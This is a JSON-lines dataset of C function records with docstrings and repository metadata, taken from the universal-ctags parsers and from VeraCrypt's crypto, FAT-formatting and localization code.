{"docstring": "/* TODO: implement this in hashtable. */\n", "func_signal": "static int  elisp_hint2kind (const vString *const hint)", "code": "{\n\tint k = eK_UNKNOWN;\n\tint n;\n\n\t/* 4 means strlen(\"(def\"). */\n#define EQN(X) strncmp(vStringValue (hint) + 4, X + 3, n) == 0\n\tswitch (vStringLength (hint) - 4)\n\t{\n\tcase 2:\n\t\tn = 2;\n\t\tif (EQN(\"defun\"))\n\t\t\tk = eK_FUNCTION;\n\t\tbreak;\n\tcase 3:\n\t\tn = 3;\n\t\tif (EQN(\"defvar\"))\n\t\t\tk = eK_VARIABLE;\n\t\telse if (EQN(\"defun*\"))\n\t\t\tk = eK_FUNCTION;\n\t\tbreak;\n\tcase 4:\n\t\tn = 4;\n\t\tif (EQN(\"defface\"))\n\t\t\tk = eK_FACE;\n\tcase 5:\n\t\tn = 5;\n\t\tif (EQN(\"defconst\"))\n\t\t\tk = eK_CONST;\n\t\telse if (EQN(\"defmacro\"))\n\t\t\tk = eK_MACRO;\n\t\telse if (EQN(\"defalias\"))\n\t\t\tk = eK_ALIAS;\n\t\telse if (EQN(\"defsubst\"))\n\t\t\tk = eK_SUBST;\n\t\telse if (EQN(\"defgroup\"))\n\t\t\tk = eK_GROUP;\n\t\telse if (EQN(\"deftheme\"))\n\t\t\tk = eK_THEME;\n\t\tbreak;\n\tcase 6:\n\t\tn = 6;\n\t\tif (EQN(\"defcustom\"))\n\t\t\tk = eK_CUSTOM;\n\t\telse if (EQN(\"defsubst*\"))\n\t\t\tk = eK_SUBST;\n\t\telse if (EQN(\"defmacro*\"))\n\t\t\tk = eK_MACRO;\n\t\tbreak;\n\tcase 7:\n\t\tn = 7;\n\t\tif (EQN(\"define-key\"))\n\t\t\tk = KIND_GHOST_INDEX;\n\t\tbreak;\n\tcase 9:\n\t\tn = 9;\n\t\tif (EQN(\"defvar-local\"))\n\t\t\tk = eK_VARIABLE;\n\t\telse if (EQN(\"define-error\"))\n\t\t\tk = eK_ERROR;\n\t\tbreak;\n\tcase 8:\n\t\tn = 8;\n\t\tif (EQN(\"defvaralias\"))\n\t\t\tk = eK_VARALIAS;\n\t\tbreak;\n\tcase 10:\n\t\tn = 10;\n\t\tif (EQN(\"define-inline\"))\n\t\t\tk = eK_INLINE;\n\t\tbreak;\n\tcase 14:\n\t\tn = 14;\n\t\tif (EQN(\"define-minor-mode\"))\n\t\t\tk = eK_MINOR_MODE;\n\t\tbreak;\n\tcase 16:\n\t\tn = 16;\n\t\tif (EQN(\"define-derived-mode\"))\n\t\t\tk = eK_DERIVED_MODE;\n\t\tbreak;\n\tcase 21:\n\t\tn = 21;\n\t\tif (EQN(\"define-global-minor-mode\"))\n\t\t\tk = eK_MINOR_MODE;\n\t\tbreak;\n\tcase 25:\n\t\tn = 25;\n\t\tif (EQN(\"define-globalized-minor-mode\"))\n\t\t\tk = eK_MINOR_MODE;\n\t\tbreak;\n\tcase 27:\n\t\tn = 27;\n\t\tif (EQN(\"define-obsolete-function-alias\"))\n\t\t\tk = eK_ALIAS;\n\t\tbreak;\n\t}\n#undef EQN\n\treturn k;\n}", "path": "ctags/parsers/lisp.c", "commit_date": "2020-02-19 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/* Create parser definition structure */\n", "func_signal": "extern parserDefinition* BibtexParser (void)", "code": "{\n\tAssert (ARRAY_SIZE (BibKinds) == BIBTAG_COUNT);\n\tstatic const char *const extensions [] = { \"bib\", NULL };\n\tparserDefinition *const def = parserNew (\"BibTeX\");\n\tdef->extensions = extensions;\n\t/*\n\t * New definitions for parsing instead of regex\n\t */\n\tdef->kindTable\t\t= BibKinds;\n\tdef->kindCount\t\t= ARRAY_SIZE (BibKinds);\n\tdef->parser\t\t\t\t= findBibTags;\n\tdef->initialize\t\t= initialize;\n\tdef->keywordTable\t= BibKeywordTable;\n\tdef->keywordCount\t= ARRAY_SIZE (BibKeywordTable);\n\treturn def;\n}", "path": "ctags/parsers/bibtex.c", "commit_date": "2019-07-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n *\tRead a C identifier beginning with \"firstChar\" and places it into\n *\t\"name\".\n */\n", "func_signal": "static void parseIdentifier (vString *const string, const int firstChar)", "code": "{\n\tint c = firstChar;\n\tAssert (isIdentChar (c));\n\tdo\n\t{\n\t\tvStringPut (string, c);\n\t\tc = getcFromInputFile ();\n\t} while (c != EOF && isIdentChar (c));\n\tif (c != EOF)\n\t\tungetcToInputFile (c);\t\t/* unget non-identifier character */\n}", "path": "ctags/parsers/bibtex.c", "commit_date": "2019-07-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/* `getLanguageComponentInFieldName' is used as part of the option parameter\n   for --_xformat option.\n\n   It splits the value of fullName into a language part and a field name part.\n   Here the two parts are combined with `.'.\n\n   If it cannot find a period, it returns LANG_IGNORE and sets\n   fullname to *fieldName.\n\n   If lang part if `*', it returns LANG_AUTO and sets the field\n   name part to *fieldName.\n\n   Though a period is found but no parser (langType) is found for\n   the language parser, this function returns LANG_IGNORE and sets\n   NULL to *fieldName.\n\n   A proper parser is found, this function returns langType for the\n   parser and sets the field name part to *fieldName. */\n", "func_signal": "static langType getLanguageComponentInFieldName (const char *fullName,\n\t\t\t\t\t\t const char **fieldName)", "code": "{\n\tconst char *tmp;\n\tlangType language;\n\n\ttmp = strchr (fullName, '.');\n\tif (tmp)\n\t{\n\t\tsize_t len = tmp - fullName;\n\n\t\tif (len == 1 && fullName[0] == '*')\n\t\t{\n\t\t\tlanguage = LANG_AUTO;\n\t\t\t*fieldName = tmp + 1;\n\t\t}\n\t\telse if (len == 0)\n\t\t{\n\t\t\tlanguage = LANG_IGNORE;\n\t\t\t*fieldName = tmp + 1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tlanguage = getNamedLanguage (fullName, len);\n\t\t\tif (language == LANG_IGNORE)\n\t\t\t\t*fieldName = NULL;\n\t\t\telse\n\t\t\t\t*fieldName = tmp + 1;\n\t\t}\n\t}\n\telse\n\t{\n\t\tlanguage = LANG_IGNORE;\n\t\t*fieldName = fullName;\n\t}\n\treturn language;\n}", "path": "ctags/main/fmt.c", "commit_date": "2020-10-19 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n   Output file name should not be evaluated in system(3) function.\n   The name must be used as is. Quotations are required to block the\n   evaluation.\n\n   Normal single-quotes are used to quote a cstring:\n   a => 'a'\n   \" => '\"'\n\n   If a single-quote is included in the cstring, use double quotes for quoting it.\n   ' => ''\"'\"''\n*/\n", "func_signal": "static void appendCstringWithQuotes (vString *dest, const char* cstr)", "code": "{\n#ifdef WIN32\n\tvStringCatS (dest, cstr);\n#else\n\tvStringPut (dest, '\\'');\n\tfor (const char *o = cstr; *o; o++)\n\t{\n\t\tif (*o == '\\'')\n\t\t\tvStringCatS (dest, \"'\\\"'\\\"'\");\n\t\telse\n\t\t\tvStringPut (dest, *o);\n\t}\n\tvStringPut (dest, '\\'');\n#endif\n}", "path": "ctags/main/sort.c", "commit_date": "2019-10-31 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n*   FUNCTION DEFINITIONS\n*/\n", "func_signal": "extern void catFile (MIO *mio)", "code": "{\n\tif (mio != NULL)\n\t{\n\t\tint c;\n\t\tmio_seek (mio, 0, SEEK_SET);\n\t\twhile ((c = mio_getc (mio)) != EOF)\n\t\t\tputchar (c);\n\t\tfflush (stdout);\n\t}\n}", "path": "ctags/main/sort.c", "commit_date": "2019-10-31 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n*   FUNCTION DEFINITIONS\n*/\n", "func_signal": "static const unsigned char *stripAbsolute (const unsigned char *filename)", "code": "{\n\tconst unsigned char *tmp;\n\n\t/* strip any absolute path */\n\tif (*filename == '/' || *filename == '\\\\')\n\t{\n\t\tbool skipSlash = true;\n\n\t\ttmp = (const unsigned char*) strrchr ((const char*) filename,  '/');\n\t\tif (tmp == NULL)\n\t\t{\t/* if no / is contained try \\ in case of a Windows filename */\n\t\t\ttmp = (const unsigned char*) strrchr ((const char*) filename, '\\\\');\n\t\t\tif (tmp == NULL)\n\t\t\t{\t/* last fallback, probably the filename doesn't contain a path, so take it */\n\t\t\t\ttmp = filename;\n\t\t\t\tskipSlash = false;\n\t\t\t}\n\t\t}\n\n\t\t/* skip the leading slash or backslash */\n\t\tif (skipSlash)\n\t\t\ttmp++;\n\t}\n\telse\n\t\ttmp = filename;\n\n\treturn tmp;\n}", "path": "ctags/parsers/diff.c", "commit_date": "2020-05-04 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n *\t FUNCTION DEFINITIONS\n */\n", "func_signal": "static tokenInfo *newToken (void)", "code": "{\n\ttokenInfo *const token = xMalloc (1, tokenInfo);\n\n\ttoken->type\t\t\t= TOKEN_UNDEFINED;\n\ttoken->keyword\t\t= KEYWORD_NONE;\n\ttoken->string\t\t= vStringNew ();\n\ttoken->lineNumber   = getInputLineNumber ();\n\ttoken->filePosition = getInputFilePosition ();\n\n\treturn token;\n}", "path": "ctags/parsers/bibtex.c", "commit_date": "2019-07-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n *\t Scanning functions\n */\n", "func_signal": "static bool parseTag (tokenInfo *const token, bibKind kind)", "code": "{\n\ttokenInfo *\tconst name = newToken ();\n\tvString *\t\tcurrentid;\n\tbool\t\t\t\teof = false;\n\n\tcurrentid = vStringNew ();\n\t/*\n\t * Bib entries are of these formats:\n\t *   @article{identifier,\n\t *   author=\"John Doe\"}\n\t *\n\t * When a keyword is found, loop through all words up to\n\t * a comma brace for the tag name.\n\t *\n\t */\n\tif (isType (token, TOKEN_KEYWORD))\n\t{\n\t\tcopyToken (name, token);\n\t\tif (!readToken (token))\n\t\t{\n\t\t\teof = true;\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\tif (isType (token, TOKEN_OPEN_CURLY))\n\t{\n\t\tif (!readToken (token))\n\t\t{\n\t\t\teof = true;\n\t\t\tgoto out;\n\t\t}\n\t\tif (isType (token, TOKEN_IDENTIFIER)){\n\t\t\tvStringCat (currentid, token->string);\n\t\t\tvStringStripTrailing (currentid);\n\t\t\tif (vStringLength (currentid) > 0)\n\t\t\t{\n\t\t\t\tvStringCopy (name->string, currentid);\n\t\t\t\tmakeBibTag (name, kind);\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{ // should find an identifier for bib item at first place\n\t\t\teof = true;\n\t\t\tgoto out;\n\t\t}\n\t}\n  \n\n out:\n\tdeleteToken (name);\n\tvStringDelete (currentid);\n\treturn eof;\n}", "path": "ctags/parsers/bibtex.c", "commit_date": "2019-07-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/* When run with --kinds-c=+lp option demonstrates spurious tags for statement\n * following a label\n */\n", "func_signal": "static void label_forced_tags(void)", "code": "{\nlabel1:\n\tproto1(arg);\nlabel2:\n\tif (arg)\n\t\tproto2(arg);\nlabel3:\n\tvariable = 3;\n\twhile (condition) {\n\tlabel4:\n\t\tproto3(arg);\n\t}\n}", "path": "ctags/Units/parser-c.r/spurious_label_tags.c.d/input.c", "commit_date": "2019-11-10 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n*   FUNCTION DEFINITIONS\n*/\n", "func_signal": "static int makeTxt2tagsTag (const vString* const name,\n                            const NestingLevels *const nls,\n                            Txt2tagsKind type)", "code": "{\n\ttagEntryInfo e;\n\tNestingLevel *nl;\n\tinitTagEntry (&e, vStringValue(name), type);\n\n\tnl = nestingLevelsGetCurrent (nls);\n\tif (nl)\n\t\te.extensionFields.scopeIndex = nl->corkIndex;\n\n\treturn makeTagEntry(&e);\n}", "path": "ctags/parsers/txt2tags.c", "commit_date": "2020-11-27 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/* Algorithm adapted from from GNU etags.\n */\n", "func_signal": "static void findLispTagsCommon (bool case_insensitive,\n\t\t\t\t\t\t\t\tbool has_namespace,\n\t\t\t\t\t\t\t\tint (*hint2kind) (const vString *))", "code": "{\n\tvString *name = vStringNew ();\n\tvString *kind_hint = vStringNew ();\n\tconst unsigned char* p;\n\n\n\twhile ((p = readLineFromInputFile ()) != NULL)\n\t{\n\t\tif (*p == '(')\n\t\t{\n\t\t\tif (L_isdef (p, case_insensitive))\n\t\t\t{\n\t\t\t\tvStringClear (kind_hint);\n\t\t\t\twhile (*p != '\\0' && !isspace ((int) *p))\n\t\t\t\t{\n\t\t\t\t\tvStringPut (kind_hint,\n\t\t\t\t\t\t\t\tcase_insensitive? toupper((int)*p): *p);\n\t\t\t\t\tp++;\n\t\t\t\t}\n\t\t\t\twhile (isspace ((int) *p))\n\t\t\t\t\tp++;\n\t\t\t\tL_getit (name, p, case_insensitive, hint2kind, kind_hint);\n\t\t\t}\n\t\t\telse if (has_namespace)\n\t\t\t{\n\t\t\t\tdo\n\t\t\t\t\tp++;\n\t\t\t\twhile (*p != '\\0' && !isspace ((int) *p)\n\t\t\t\t\t\t&& *p != ':' && *p != '(' && *p != ')');\n\t\t\t\tif (*p == ':')\n\t\t\t\t{\n\t\t\t\t\tdo\n\t\t\t\t\t\tp++;\n\t\t\t\t\twhile (*p == ':');\n\n\t\t\t\t\tif (L_isdef (p - 1, case_insensitive))\n\t\t\t\t\t{\n\t\t\t\t\t\tvStringClear (kind_hint);\n\t\t\t\t\t\twhile (*p != '\\0' && !isspace ((int) *p))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tvStringPut (kind_hint,\n\t\t\t\t\t\t\t\t\t\tcase_insensitive? toupper((int)*p): *p);\n\t\t\t\t\t\t\tp++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\twhile (isspace (*p))\n\t\t\t\t\t\t\tp++;\n\t\t\t\t\t\tL_getit (name, p, case_insensitive, hint2kind, kind_hint);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tvStringDelete (name);\n\tvStringDelete (kind_hint);\n}", "path": "ctags/parsers/lisp.c", "commit_date": "2020-02-19 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "// NO_OPTIMIZED_VERSIONS\n", "func_signal": "void sha512_begin(sha512_ctx* ctx)", "code": "{\n\tctx->hash[0] = LL(0x6a09e667f3bcc908);\n\tctx->hash[1] = LL(0xbb67ae8584caa73b);\n\tctx->hash[2] = LL(0x3c6ef372fe94f82b);\n\tctx->hash[3] = LL(0xa54ff53a5f1d36f1);\n\tctx->hash[4] = LL(0x510e527fade682d1);\n\tctx->hash[5] = LL(0x9b05688c2b3e6c1f);\n\tctx->hash[6] = LL(0x1f83d9abfb41bd6b);\n\tctx->hash[7] = LL(0x5be0cd19137e2179);\n\tctx->count[0] = 0;\n\tctx->count[1] = 0;\n\n\tif (!transfunc)\n\t{\n#ifndef NO_OPTIMIZED_VERSIONS\n#if CRYPTOPP_BOOL_X64\n\t\tif (g_isIntel&& HasSAVX2() && HasSBMI2())\n\t\t\ttransfunc = Avx2Transform;\n\t\telse if (g_isIntel && HasSAVX())\n\t\t{\n\t\t\t\ttransfunc = AvxTransform;\n\t\t}\n\t\telse if (HasSSE41())\n\t\t{\n\t\t\t\ttransfunc = SSE4Transform;\n\t\t}\n\t\telse\n#endif\n\n#if CRYPTOPP_BOOL_X64 || ((CRYPTOPP_BOOL_X86 || CRYPTOPP_BOOL_X32) && !defined (TC_MACOSX))\n#if CRYPTOPP_BOOL_X64\n\t\tif (HasSSE2())\n#else\n\t\tif (HasSSSE3() && HasMMX())\n#endif\n\t\t\t\ttransfunc = SSE2Transform;\n\t\telse\n#endif\n\n#endif\n\t\t\ttransfunc = StdTransform;\n\t}\n}", "path": "VeraCrypt/src/Crypto/Sha2.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/**\n * Generator of one 64 bit random number\n * Function fills rand_data->data\n *\n * @ec [in] Reference to entropy collector\n */\n", "func_signal": "static void jent_gen_entropy(struct rand_data *ec)", "code": "{\n\tunsigned int k = 0;\n\n\t/* priming of the ->prev_time value */\n\tjent_measure_jitter(ec);\n\n\twhile (1) {\n\t\t/* If a stuck measurement is received, repeat measurement */\n\t\tif (jent_measure_jitter(ec))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * We multiply the loop value with ->osr to obtain the\n\t\t * oversampling rate requested by the caller\n\t\t */\n\t\tif (++k >= (DATA_SIZE_BITS * ec->osr))\n\t\t\tbreak;\n\t}\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/* FAT32 FSInfo */\n", "func_signal": "static void PutFSInfo (unsigned char *sector, fatparams *ft)", "code": "{\n\tmemset (sector, 0, ft->sector_size);\n\tsector[3]=0x41; /* LeadSig */\n\tsector[2]=0x61;\n\tsector[1]=0x52;\n\tsector[0]=0x52;\n\tsector[484+3]=0x61; /* StrucSig */\n\tsector[484+2]=0x41;\n\tsector[484+1]=0x72;\n\tsector[484+0]=0x72;\n\n\t// Free cluster count\n\t*(uint32 *)(sector + 488) = LE32 (ft->cluster_count - ft->size_root_dir / ft->sector_size / ft->cluster_size);\n\n\t// Next free cluster\n\t*(uint32 *)(sector + 492) = LE32 (2);\n\n\tsector[508+3]=0xaa; /* TrailSig */\n\tsector[508+2]=0x55;\n\tsector[508+1]=0x00;\n\tsector[508+0]=0x00;\n}", "path": "VeraCrypt/src/Common/Fat.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "// TC_MINIMIZE_CODE_SIZE\n", "func_signal": "void twofish_decrypt(TwofishInstance *instance, const u4byte in_blk[4], u4byte out_blk[4])", "code": "{   u4byte  t0, t1, blk[4];\n\n\tu4byte *l_key = instance->l_key;\n#ifdef TC_WINDOWS_BOOT_TWOFISH\n\tu4byte *mk_tab = instance->mk_tab;\n#endif\n\tint i;\n\n    blk[0] = LE32(in_blk[0]) ^ l_key[4];\n    blk[1] = LE32(in_blk[1]) ^ l_key[5];\n    blk[2] = LE32(in_blk[2]) ^ l_key[6];\n    blk[3] = LE32(in_blk[3]) ^ l_key[7];\n\n\tfor (i = 7; i >= 0; --i)\n\t{\n\t\tt1 = g1_fun(blk[1]); t0 = g0_fun(blk[0]);\n\t\tblk[2] = rotl(blk[2], 1) ^ (t0 + t1 + l_key[4 * (i) + 10]);\n\t\tblk[3] = rotr(blk[3] ^ (t0 + 2 * t1 + l_key[4 * (i) + 11]), 1);\n\t\tt1 = g1_fun(blk[3]); t0 = g0_fun(blk[2]);\n\t\tblk[0] = rotl(blk[0], 1) ^ (t0 + t1 + l_key[4 * (i) +  8]);\n\t\tblk[1] = rotr(blk[1] ^ (t0 + 2 * t1 + l_key[4 * (i) +  9]), 1);\n\t}\n\n    out_blk[0] = LE32(blk[2] ^ l_key[0]);\n    out_blk[1] = LE32(blk[3] ^ l_key[1]);\n    out_blk[2] = LE32(blk[0] ^ l_key[2]);\n    out_blk[3] = LE32(blk[1] ^ l_key[3]);\n}", "path": "VeraCrypt/src/Crypto/Twofish.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "// TC_MINIMIZE_CODE_SIZE\n", "func_signal": "void twofish_encrypt(TwofishInstance *instance, const u4byte in_blk[4], u4byte out_blk[])", "code": "{   u4byte  t0, t1, blk[4];\n\n\tu4byte *l_key = instance->l_key;\n#ifdef TC_WINDOWS_BOOT_TWOFISH\n\tu4byte *mk_tab = instance->mk_tab;\n#endif\n\tint i;\n\n\tblk[0] = LE32(in_blk[0]) ^ l_key[0];\n    blk[1] = LE32(in_blk[1]) ^ l_key[1];\n    blk[2] = LE32(in_blk[2]) ^ l_key[2];\n    blk[3] = LE32(in_blk[3]) ^ l_key[3];\n\n\tfor (i = 0; i <= 7; ++i)\n\t{\n\t\tt1 = g1_fun(blk[1]); t0 = g0_fun(blk[0]);\n\t\tblk[2] = rotr(blk[2] ^ (t0 + t1 + l_key[4 * (i) + 8]), 1);\n\t\tblk[3] = rotl(blk[3], 1) ^ (t0 + 2 * t1 + l_key[4 * (i) + 9]);\n\t\tt1 = g1_fun(blk[3]); t0 = g0_fun(blk[2]);\n\t\tblk[0] = rotr(blk[0] ^ (t0 + t1 + l_key[4 * (i) + 10]), 1);\n\t\tblk[1] = rotl(blk[1], 1) ^ (t0 + 2 * t1 + l_key[4 * (i) + 11]);\n\t}\n\n    out_blk[0] = LE32(blk[2] ^ l_key[4]);\n    out_blk[1] = LE32(blk[3] ^ l_key[5]);\n    out_blk[2] = LE32(blk[0] ^ l_key[6]);\n    out_blk[3] = LE32(blk[1] ^ l_key[7]);\n}", "path": "VeraCrypt/src/Crypto/Twofish.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "// lParam = 1: auto mode\n", "func_signal": "BOOL CALLBACK LanguageDlgProc (HWND hwndDlg, UINT msg, WPARAM wParam, LPARAM lParam)", "code": "{\n\tWORD lw = LOWORD (wParam);\n\tWORD hw = HIWORD (wParam);\n\n\tswitch (msg)\n\t{\n\tcase WM_INITDIALOG:\n\t\t{\n\t\t\tchar *xml;\n\t\t\tchar attr[2048], lastLangId[10];\n\t\t\tWCHAR wattr[2048];\n\t\t\tint len;\n\t\t\tint langCount = 0;\n\t\t\tBOOL defaultLangFound = FALSE;\n\n\t\t\tLocalizeDialog (hwndDlg, \"IDD_LANGUAGE\");\n\t\t\tToHyperlink (hwndDlg, IDC_GET_LANG_PACKS);\n\n\t\t\tfor (xml = MapFirstLanguageFile (); xml != NULL; xml = MapNextLanguageFile (0))\n\t\t\t{\n\t\t\t\twhile (xml = XmlFindElement (xml, \"language\"))\n\t\t\t\t{\n\t\t\t\t\tXmlGetAttributeText (xml, \"name\", attr, sizeof (attr));\n\t\t\t\t\tlen = MultiByteToWideChar (CP_UTF8, 0, attr, -1, wattr, sizeof (wattr) / sizeof(wattr[0]));\n\n\t\t\t\t\tif (len != 0\n\t\t\t\t\t\t&& (!defaultLangFound || wcscmp (wattr, L\"English\") != 0))\n\t\t\t\t\t{\n\t\t\t\t\t\tint i = (int) SendDlgItemMessageW (hwndDlg, IDC_LANGLIST, LB_ADDSTRING, 0, (LPARAM)wattr);\n\t\t\t\t\t\tif (i >= 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tint id;\n\n\t\t\t\t\t\t\t// Encode language id in LPARAM\n\t\t\t\t\t\t\tXmlGetAttributeText (xml, \"langid\", attr, sizeof (attr));\n\t\t\t\t\t\t\tswitch (strlen (attr))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase 2: id = attr[0] | attr[1] << 8; break;\n\t\t\t\t\t\t\tcase 5: id = attr[0] | attr[1] << 8 | attr[3] << 16 | attr[4] << 24; break;\n\t\t\t\t\t\t\tdefault: continue;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (!defaultLangFound)\n\t\t\t\t\t\t\t\tdefaultLangFound = TRUE;\n\n\t\t\t\t\t\t\tSendDlgItemMessage (hwndDlg, IDC_LANGLIST, LB_SETITEMDATA, i, (LPARAM) id);\n\n\t\t\t\t\t\t\tif (strcmp (attr, PreferredLangId) == 0)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tchar credits [10000];\n\t\t\t\t\t\t\t\tWCHAR wcredits [10000];\n\t\t\t\t\t\t\t\tWCHAR wversion [20];\n\t\t\t\t\t\t\t\twchar_t szVers [200];\n\t\t\t\t\t\t\t\tint nLen;\n\n\t\t\t\t\t\t\t\tSendDlgItemMessage (hwndDlg, IDC_LANGLIST, LB_SETCURSEL, i, 0);\n\n\t\t\t\t\t\t\t\t// Language pack version\n\t\t\t\t\t\t\t\tif (!ActiveLangPackVersion[0] || memcmp (ActiveLangPackVersion, \"0.0.0\", 5) == 0)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tStringCbPrintfW (szVers, sizeof(szVers), GetString(\"LANG_PACK_VERSION\"), L\"--\");\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tnLen = MultiByteToWideChar (CP_UTF8, 0, ActiveLangPackVersion, -1, wversion, sizeof (wversion) / sizeof(wversion[0]));\n\t\t\t\t\t\t\t\t\tif (nLen != 0)\n\t\t\t\t\t\t\t\t\t\tStringCbPrintfW (szVers, sizeof(szVers),GetString(\"LANG_PACK_VERSION\"), wversion);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tSetWindowTextW (GetDlgItem (hwndDlg, IDC_LANGPACK_VERSION), szVers);\n\n\t\t\t\t\t\t\t\t// Translator credits\n\t\t\t\t\t\t\t\tXmlGetAttributeText (xml, \"translators\", credits, sizeof (credits));\n\t\t\t\t\t\t\t\tnLen = MultiByteToWideChar (CP_UTF8, 0, credits, -1, wcredits, sizeof (wcredits) / sizeof(wcredits[0]));\n\t\t\t\t\t\t\t\tif (nLen != 0)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tSetWindowTextW (GetDlgItem (hwndDlg, IDC_LANGPACK_CREDITS), wcredits);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tStringCbCopyA (lastLangId, sizeof(lastLangId),attr);\n\t\t\t\t\t\t\tlangCount++;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\txml++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (lParam == 1)\n\t\t\t{\n\t\t\t\t// Auto mode\n\t\t\t\tif (langCount < 2)\n\t\t\t\t\tEndDialog (hwndDlg, IDCANCEL);\n\n\t\t\t\tif (langCount == 2)\n\t\t\t\t\tStringCbCopyA (PreferredLangId, sizeof(PreferredLangId), lastLangId);\n\n\t\t\t\tEndDialog (hwndDlg, IDOK);\n\t\t\t}\n\n\t\t\treturn 1;\n\t\t}\n\n\tcase WM_COMMAND:\n\n\t\tif (lw == IDOK || hw == LBN_DBLCLK)\n\t\t{\n\t\t\tint i = (int) SendDlgItemMessage (hwndDlg, IDC_LANGLIST, LB_GETCURSEL, 0, 0);\n\n\t\t\tif (i >= 0)\n\t\t\t{\n\t\t\t\tint id = (int) SendDlgItemMessage (hwndDlg, IDC_LANGLIST, LB_GETITEMDATA, i, 0);\n\n\t\t\t\tif (id != LB_ERR)\n\t\t\t\t{\n\t\t\t\t\tchar l[6];\n\n\t\t\t\t\t// Decode language id from LPARAM\n\t\t\t\t\tl[0] = (char) id;\n\t\t\t\t\tl[1] = (char) (id >> 8);\n\t\t\t\t\tl[2] = 0;\n\n\t\t\t\t\tif ((id & 0xffff0000) != 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tl[2] = '-';\n\t\t\t\t\t\tl[3] = (char) (id >> 16);\n\t\t\t\t\t\tl[4] = id >> 24;\n\t\t\t\t\t\tl[5] = 0;\n\t\t\t\t\t}\n\n\t\t\t\t\tif (SendDlgItemMessage (hwndDlg, IDC_LANGLIST, LB_GETCOUNT, 0, 0) > 1)\n\t\t\t\t\t\tStringCbCopyA (PreferredLangId, sizeof(PreferredLangId), l);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tEndDialog (hwndDlg, IDOK);\n\t\t\treturn 1;\n\t\t}\n\n\t\tif (lw == IDCANCEL)\n\t\t{\n\t\t\tEndDialog (hwndDlg, lw);\n\t\t\treturn 1;\n\t\t}\n\n\t\tif (lw == IDC_GET_LANG_PACKS)\n\t\t{\n\t\t\tchar tmpstr [256];\n\n\t\t\tif (strlen (ActiveLangPackVersion) > 0 && strlen (GetPreferredLangId()) > 0)\n\t\t\t\tStringCbPrintfA (tmpstr, sizeof(tmpstr), \"&langpackversion=%s&lang=%s\", ActiveLangPackVersion, GetPreferredLangId());\n\t\t\telse\n\t\t\t\ttmpstr[0] = 0;\n\n\t\t\tApplink (\"localizations\");\n\n\t\t\treturn 1;\n\t\t}\n\t\treturn 0;\n\t}\n\n\treturn 0;\n}", "path": "VeraCrypt/src/Common/Language.c", "commit_date": "2020-03-10 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
